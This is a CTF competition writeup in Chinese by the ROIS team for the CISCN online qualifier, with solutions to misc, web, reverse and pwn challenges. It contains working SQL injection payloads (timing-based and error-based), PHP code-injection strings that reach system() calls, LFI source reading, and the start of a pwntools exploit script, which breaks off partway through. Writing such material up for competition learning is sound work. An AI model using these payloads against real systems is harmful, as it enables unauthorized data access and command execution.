# ROIS CISCN线上初赛 Writeup
## Misc
### 签到
根据题目提示，三个男生女装对着摄像头跳宅舞就行了。我们跳的是《ハレ晴レユカイ》。
### saleae
使用saleae logic打开，有4个channel，使用SPI协议分析，直接提取出flag  
### 24c
还是使用saleae logic打开，有2个channel，使用I2C协议分析  
查询24c文档可以知道`Setup Write` 之后需要输入的一个字符, 是为写储存的首地址
分析每段的输入 如下
第一段中为 ``， ord(' ') = 32  
第二段中为 `0`，  
第三段中为 `\t`， ord('\t') = 9
所以最终flag写的过程是
### usbasp
4个channel，使用SPI协议分析，注意setting最后一条要修改，提取出一串ascii码，转码得到flag
## Web
### 全宇宙最简单的SQL
盲注。
发现`or`、`||`被过滤，采用`^`配合`AND`进行注入。发现`SLEEP`和`BENCHMARK`被过滤，使用正则DoS方式进行时间盲注。又由于不知道列名，因此再套一层，Payload如下：
    admin'^(select+(select b from (select 1 as a,2 as b from user where 1=2 union select * from user) b) like'f1ag%'+and+concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'))+RLIKE+'(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2bb')^'1'%3d'1#
后发现，还可以使用报错注入。如果报错，页面会提示“数据库操作错误”。基本Payload如下：
    username='^(select exp(~((select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) ))*18446744073709551615)))#&password=admin
很快注出密码是`f1ag@1s-at_/fll1llag_h3r3`，不过因为大小写不正确，要使用binary like。最终验证：
    username='^(select exp(~((select( 2*length(( select c.b from (select 1 as a,2 as b from user union select * from user)c where a like binary 'admin' and b like binary 'F1AG@1s-at\_/fll1llag\_h3r3' ))=25))*18446744073709551615)))#&password=1
登录进去后就是老梗题，最近至少出现了三次，利用MySQL来手动读文件。
直接打即可。
### JustSoSo
（但是没交上）
### love_math
那么多数学函数，实际上唯一能用的只有进制转换类，即`base_convert`、`dechex`，通过其能导出[0-9a-z]在内的字符。
经过一大堆失败的实验，如：
    // phpinfo();
    (base_convert(55490343972,10,36))();
    // system('cat /*');
    $pi=base_convert(9911,10,28);base_convert(1751504350,10,36)($pi(99).$pi(97).$pi(116).$pi(32).$pi(42));
    // system($_GET);
    $pi=base_convert(16191,10,36);$pi=$pi(95).$pi(71).$pi(69).$pi(84);base_convert(1751504350,10,36)($$pi{pi});
最后使用`system(getallheaders(){9})`
    $pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})
### RefSpace
首先扫目录，扫出
  * /index.php
  * /robots.txt
  * /flag.txt
  * /backup.zip
  * /?route=app/index
  * /?route=app/Up10aD
  * /?route=app/flag
这个flag.txt看起来是加密过的，没啥用，先下载下来再说。从`app/flag`处，通过让参数为Array，可以得到报错信息，可以得到一个PHP文件`/ctf/sdk.php`
接着就是老梗LFI base64读源码，各种读。  
读到`/ctf/sdk.php`，发现这是经过SourceGuardian加密的。作者给了个提示：
    我们的SDK通过如下SHA1算法验证key是否正确:
    public function verify($key)
    {
        if (sha1($key) === $this->getHash()) {
            return "too{young-too-simple}";
        }
        return false;
    }
    ...
    3.您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。
出题人三令五申不要去解密这个文件，那应该就不需要解密这个文件。不管怎么说，本地反射先。
    php > $a = new ReflectionClass('\interesting\FlagSDK');
    php > var_dump($a->getMethods());
    php shell code:1:
    array(2) {
      [0] =>
      class ReflectionMethod#2 (2) {
        public $name =>
        string(7) "getHash"
        public $class =>
        string(19) "interesting\FlagSDK"
      }
      [1] =>
      class ReflectionMethod#3 (2) {
        public $name =>
        string(6) "verify"
        public $class =>
        string(19) "interesting\FlagSDK"
      }
    }
    php > var_dump($a->getProperties());
    php shell code:1:
    array(1) {
      [0] =>
      class ReflectionProperty#2 (2) {
        public $name =>
        string(8) "flagPath"
        public $class =>
        string(19) "interesting\FlagSDK"
      }
    }
    php > $d = $a->getProperty('flagPath');
    php > echo $d->getValue($b);
    /var/www/html/flag.txt
可以看出这个类就两个函数，`getHash`和`verify`，还有一个`flagPath`的属性，值是那个`flag.txt`。但不知道这个`getHash`的返回值究竟是啥，反射调用先
    php > $b = new \interesting\FlagSDK();
    php > $cc = $a->getMethod('getHash');
    php > $cc->setAccessible(true);
    php > echo $cc->invoke($b);
    a356bc8d9d3e69beea3c15d40995f395425e7813
似乎是个固定值，服务器上通过phar传Shell也证明了这一点。But nobody
cares，实践才是最重要的。让我们来手撕加密吧。（出题人内心OS：？？？？？？我不是都说别搞我加密了吗）
先去clone PHP源码，编译一下，再去SourceGuardian官网下载和我本地对应版本的PHP扩展，然后根据他的代码来模仿写一个：
接着让我们来魔改PHP内核，在`zend_vm_init_call_frame`处打log来得到函数调用信息：
然后执行代码，从这个函数调用，就可以看出`getHash`真的只是`return
'a356bc8d9d3e69beea3c15d40995f395425e7813'`而已，并没有别的用途。
我们现在知道，flag其实就藏在`verify`函数里了。我本来想给所有和比较有关的函数都打上标记，但根据题目提示，题目只用到了`===`。因此修改`zend_is_identical`的返回值，直接让他return
1.
然后把题目给的`flag.txt`丢到`/var/www/html/flag.txt`，就跑出来了。
另外，这个被加密的代码逻辑是
    public function verify($key)
    {
        if (sha1($key) === $this->getHash()) {
            $a = base64_decode(file_get_contents($this->flagPath));
            return openssl_private_decrypt($a, "RSA_KEY");
        }
        return false;
    }
很容易也就能把他的RSA密钥解出来，这个就没啥好说的了。专业SG11解密，比市场价便宜.jpg
## Re
### easyGo
下载了个golanghelper帮助IDA发现程序  
动态跟踪后发现flag就在内存中
    pwndbg> telescope 0xc0000181e0
    00:0000│ rsi r12  0xc0000181e0 ◂— 0x3032397b67616c66 ('flag{920')
    01:0008│          0xc0000181e8 ◂— 0x33332d6661643439 ('94daf-33')
    02:0010│          0xc0000181f0 ◂— 0x2d653133342d3963 ('c9-431e-')
    03:0018│          0xc0000181f8 ◂— 0x6662382d61353861 ('a85a-8bf')
    04:0020│          0xc000018200 ◂— 'bd5df98ad}'
    05:0028│          0xc000018208 ◂— 0x7d64 /* 'd}' */
    06:0030│          0xc000018210 ◂— 0x0
### bbvvmm
程序验证username和passwd  
username用了sm4加密又base64，sm4密钥给了，逆着来就行了  
passwd验证的代码太长，动态开调，后来发现就写在内存中
    #https://github.com/yang3yen/pysm4
    from pysm4 import decrypt
    import base64
    #a = "IJLMNOPKABDEFGHCQRTUVWXSYZbcdefa45789+/6ghjklmnioprstuvqwxz0123y"
    #b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    #crypto_text = "RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y="
    #table = ''.maketrans(a, b)
    #print(base64.b64decode(crypto_text.translate(table)))
    m = 0xEF468DBAF985B2509C9E200CF3525AB6
    key = 0xda98f1da312ab753a5703a0bfd290dd6
    temp = hex(decrypt(m,key))[2:-1]
    a = ""
    for i in range(len(temp)/2):
        a += chr(int(temp[2*i:2*i+2],16))
    temp = a
    a = ""
    for i in range(len(temp)/2):
        a += chr(int(temp[2*i:2*i+2],16))
    print "name is " + a
username = "badrer12"  
密码出现在内存中
    00000000022D14F0  C0 25 2D 02 00 00 00 78  72 00 00 00 00 00 00 0A  ..-....xr.......
    00000000022D1500  C0 25 2D 02 00 00 00 79  71 00 00 00 00 00 00 08  ..-....yq.......
    00000000022D1510  C0 25 2D 02 00 00 00 7A  77 00 00 00 00 00 00 0D  ..-....zw.......
    00000000022D1520  C0 25 2D 02 00 00 00 7B  65 00 00 00 00 00 00 1E  ..-....{e.......
    00000000022D1530  C0 25 2D 02 00 00 00 7C  72 00 00 00 00 00 00 0E  ..-....|r.......
    00000000022D1540  C0 25 2D 02 00 00 00 7D  71 00 00 00 00 00 00 0C  ..-....}q.......
    00000000022D1550  1A 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
passwd="xyz{|}"
    from pwn import *
    p = remote("39.97.228.196","10001")
    p.recvuntil("Username:")
    p.sendline("badrer12")
    p.recvuntil("Password:")
    p.send("xyz{|}")
    p.interactive()
## Pwn
### your_pwn
数组下标越界造成任意读和写（代码有点丑
    from pwn import *
    p = process("./pwn")
    elf = ELF("./pwn")
    # p = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")
    def main():
        gdb.attach(p)
        p.recvuntil("input your name \nname:")
        p.send("\x00")
        start_offset = 349
        program_base = 0
        #leak program_base
        for i in range(6):
            p.recvuntil("input index")
            p.sendline(str(start_offset-i))